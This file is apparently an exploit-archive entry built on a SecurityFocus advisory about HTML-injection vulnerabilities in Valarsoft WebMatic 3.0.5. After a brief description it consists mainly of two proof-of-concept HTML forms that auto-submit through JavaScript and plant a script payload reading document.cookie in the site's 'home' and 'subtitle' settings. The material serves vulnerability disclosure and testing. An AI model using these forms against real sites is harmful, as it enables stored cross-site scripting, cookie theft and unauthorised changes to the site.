@@ -1,0 +1,61 @@
+source: http://www.securityfocus.com/bid/42767/info
+
+Valarsoft WebMatic is prone to multiple HTML-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Valarsoft WebMatic 3.0.5 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/index.php" method="post" name="main" >
+<input type="hidden" name="browser_bar_title" value="Webmatic" />
+<input type="hidden" name="title" value="Welcome to Webmatic" />
+<input type="hidden" name="special_user_label" value="Special user" />
+<input type="hidden" name="staff_name" value="Webmatic editorial staff" />
+<input type="hidden" name="home" value=&#039;Webmatic its2"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="foot" value="" />
+<input type="hidden" name="signalation_email_subject" value="Subject" />
+<input type="hidden" name="signalation_email_text" value="text" />
+<input type="hidden" name="user_registration_email_subject" value="Subject" />
+<input type="hidden" name="user_registration_email_text" value="text" />
+<input type="hidden" name="send" value="Save" />
+<input type="hidden" name="languageID" value="1" />
+<input type="hidden" name="stage" value="2" />
+<input type="hidden" name="section" value="21" />
+<input type="hidden" name="action" value="578" />
+</form>
+<script>
+document.main.submit();
+</script>
+
+<form action="http://www.example.com/index.php" method="post" name="main" >
+<input type="hidden" name="title" value="pagetest" />
+<input type="hidden" name="subtitle" value=&#039;some subtitle and"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="enabled" value="1" />
+<input type="hidden" name="categoryID" value="1" />
+<input type="hidden" name="page_type" value="1" />
+<input type="hidden" name="visibility" value="1" />
+<input type="hidden" name="groupID" value="1" />
+<input type="hidden" name="backID" value="0" />
+<input type="hidden" name="left_panels_enabled" value="1" />
+<input type="hidden" name="right_panels_enabled" value="1" />
+<input type="hidden" name="render_mode" value="2" />
+<input type="hidden" name="head" value="" />
+<input type="hidden" name="body" value="" />
+<input type="hidden" name="hr_width" value="100" />
+<input type="hidden" name="hr_size" value="1" />
+<input type="hidden" name="hr_align" value="0" />
+<input type="hidden" name="img_picture" value="1.gif" />
+<input type="hidden" name="img_border" value="0" />
+<input type="hidden" name="a_link" value="1" />
+<input type="hidden" name="a_url" value="" />
+<input type="hidden" name="a_text" value="" />
+<input type="hidden" name="foot" value="" />
+<input type="hidden" name="send" value="Save" />
+<input type="hidden" name="stage" value="2" />
+<input type="hidden" name="section" value="14" />
+<input type="hidden" name="action" value="216" />
+<input type="hidden" name="pageID" value="2" />
+</form>
+<script>
+document.main.submit();
+</script>
